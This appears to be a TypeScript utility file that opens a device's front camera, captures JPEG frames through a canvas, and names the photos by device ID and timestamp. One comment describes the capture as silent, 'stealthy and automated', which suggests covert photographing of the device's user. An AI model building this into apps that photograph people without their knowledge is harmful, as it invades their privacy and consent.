/**
 * Camera initialization and canvas snapshot capture utilities
 */

export async function initFrontCameraStream(): Promise<MediaStream> {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error('Camera API (getUserMedia) is not supported in this browser or environment.');
  }

  // First priority: Front camera ('user') with ideal high definition
  try {
    return await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      },
      audio: false
    });
  } catch (err: unknown) {
    console.warn('Could not get ideal front camera resolution, falling back to basic facingMode: user', err);
    try {
      return await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
    } catch (fallbackErr: unknown) {
      console.warn('Could not get user facing camera, falling back to default video stream', fallbackErr);
      return await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
      });
    }
  }
}

export interface SnapshotResult {
  blob: Blob;
  dataUrl: string;
  width: number;
  height: number;
}

/**
 * Captures a completely silent snapshot from an HTMLVideoElement using HTML5 Canvas API.
 * No audio is played, keeping the operation stealthy and automated.
 */
export async function captureSilentCanvasFrame(
  videoElement: HTMLVideoElement,
  quality: number = 0.92
): Promise<SnapshotResult> {
  const width = videoElement.videoWidth || 1280;
  const height = videoElement.videoHeight || 720;

  const canvas = document.createElement('canvas');
  canvas.width = width;
  canvas.height = height;
  const ctx = canvas.getContext('2d');

  if (!ctx) {
    throw new Error('Failed to create 2D canvas context for frame capture.');
  }

  // Draw current video frame to canvas
  ctx.drawImage(videoElement, 0, 0, width, height);

  // Convert to high-resolution JPEG blob
  const blob = await new Promise<Blob>((resolve, reject) => {
    canvas.toBlob(
      (b) => {
        if (b) resolve(b);
        else reject(new Error('Canvas toBlob conversion failed.'));
      },
      'image/jpeg',
      quality
    );
  });

  const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

  return {
    blob,
    dataUrl,
    width,
    height
  };
}

/**
 * Generates storage filename path matching required pattern:
 * {device_id}/photo_{timestamp}_1.jpg or {device_id}/photo_{timestamp}_2.jpg
 */
export function generatePhotoStoragePath(
  deviceId: string,
  timestampStr: string,
  index: 1 | 2
): string {
  const sanitizedDeviceId = deviceId.trim().replace(/[/\\?%*:|"<>]/g, '_') || 'Phone_01';
  return `${sanitizedDeviceId}/photo_${timestampStr}_${index}.jpg`;
}

/**
 * Generates an URL-safe timestamp string for filenames
 */
export function getFileSafeTimestamp(date: Date = new Date()): string {
  const pad = (n: number) => n.toString().padStart(2, '0');
  const y = date.getFullYear();
  const m = pad(date.getMonth() + 1);
  const d = pad(date.getDate());
  const h = pad(date.getHours());
  const min = pad(date.getMinutes());
  const s = pad(date.getSeconds());
  return `${y}${m}${d}_${h}${min}${s}`;
}
